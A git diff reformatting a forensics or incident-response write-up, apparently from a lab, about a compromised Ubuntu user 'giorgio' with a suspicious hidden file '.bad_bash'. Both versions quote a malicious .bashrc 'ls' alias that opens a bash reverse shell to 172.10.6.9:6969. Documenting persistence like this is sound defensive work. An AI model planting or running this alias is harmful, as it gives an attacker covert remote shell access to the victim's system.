@@ -20,6 +20,7 @@ Access was provided using privileged credentials:
 
 - **Operating System:** Ubuntu 20.04.6 LTS
 - **User Accounts Investigated:** giorgio, root, nobody
+  
 <p align="center">
   <img src="https://i.imgur.com/Eu6VVQ8.png" width="80%" alt="March Logs"/>
 </p>
@@ -41,25 +42,29 @@ Access was provided using privileged credentials:
 
 ### 1. User Account Investigation – giorgio
 
-**Interesting File Identified**
-- File: `.bad_bash`  
-- Location: `/home/giorgio/`  
-- Significance: Suspicious hidden file indicating tampering or persistence setup
+#### Suspicious File Discovery
 
-**Modified Bash Alias**
-A malicious alias was discovered in `.bashrc`:
+**File Identified**
+- **Filename:** `.bad_bash`  
+- **Location:** `/home/giorgio/`  
 
-```bash
-ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
-Purpose: Establishes a reverse shell when the ls command is executed
+**Significance**  
+The presence of a hidden file named `.bad_bash` in the user’s home directory is indicative of unauthorized modification. Hidden files with misleading names are commonly used by attackers to store malicious scripts or maintain persistence while avoiding casual detection.
 
-Backdoor Type: User-level shell persistence
-
-```
 <p align="center">
   <img src="https://i.imgur.com/0uLej3R.png" width="80%" alt="March Logs"/>
 </p>
+---
 
+#### Malicious Bash Alias Persistence
+
+**Modified `.bashrc` Entry**  
+A malicious alias was discovered within the user’s `.bashrc` file:
+
+```bash
+ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
+
+```
 <p align="center">
   <img src="https://i.imgur.com/ewxbCBP.png" width="80%" alt="March Logs"/>
 </p>
